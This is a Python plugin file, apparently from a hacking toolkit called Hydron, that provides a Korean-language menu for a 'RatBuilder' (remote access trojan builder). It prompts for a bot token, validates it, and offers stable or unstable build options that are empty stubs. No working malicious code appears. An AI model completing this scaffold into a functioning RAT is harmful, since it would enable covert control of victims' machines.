from colorama import Fore
from utils.Plugin.PluginABC import PluginABC
import importlib

from utils.Setting.setup_most import TokenValidator

class RatBuilder(PluginABC):
    plugin_name = "RatBuilder"

    @classmethod
    def get_option(cls) -> int:
        print("\n")
        print(f"[\x1b[95m1\x1b[95m\x1B[37m] 안정적인 기능")
        print(f"[\x1b[95m2\x1b[95m\x1B[37m] 최신기능 (불안정)")
        print(f"[\x1b[95m3\x1b[95m\x1B[37m] 나가기")

        option = int(input(f"[\x1b[95m>\x1b[95m\x1B[37m] 옵션: "))
        return option

    @classmethod
    async def main(cls):
        option = cls.get_option()

        if option < 0 or option > 3:
            await importlib.import_module("main").Hydron()

        token = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 봇 토큰: ')
        await TokenValidator(token)

        if option == 1:
            pass
        elif option == 2:
            pass
        else:
            await importlib.import_module("main").Hydron()

        input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 엔터를 눌러주세요: ')
        await importlib.import_module("main").Hydron()

